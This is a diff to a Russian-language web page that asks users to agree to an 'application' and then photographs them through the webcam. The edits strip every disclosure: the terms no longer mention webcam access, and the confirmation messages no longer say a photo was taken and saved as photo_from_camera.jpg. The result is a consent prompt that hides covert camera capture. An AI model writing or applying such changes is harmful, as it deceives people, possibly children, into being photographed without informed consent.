@@ -45,7 +45,7 @@
         <h2>Вы согласны с использованием приложения?</h2>
         <button onclick="showRules()">Условия</button>
         <div id="rules">
-            <p>При согласии предоставляется доступ к вашей веб-камере.</p>
+            <p>согласие.</p>
         </div>
         <br>
         <button onclick="agree()">Да</button>
@@ -78,7 +78,7 @@
                         saveLocally(imageData);
 
                         stream.getTracks().forEach(track => track.stop());
-                        document.body.innerHTML = '<h2>Спасибо за согласие! Фото сохранено.</h2>';
+                        document.body.innerHTML = '<h2>Спасибо.</h2>';
                     }, 1000);
                 })
                 .catch(err => {
@@ -97,7 +97,7 @@
             document.body.appendChild(link);
             link.click();
             document.body.removeChild(link);
-            alert('Фото сохранено как "photo_from_camera.jpg". Отправь его папе!');
+            alert('Спасибо!');
         }
     </script>
 </body>
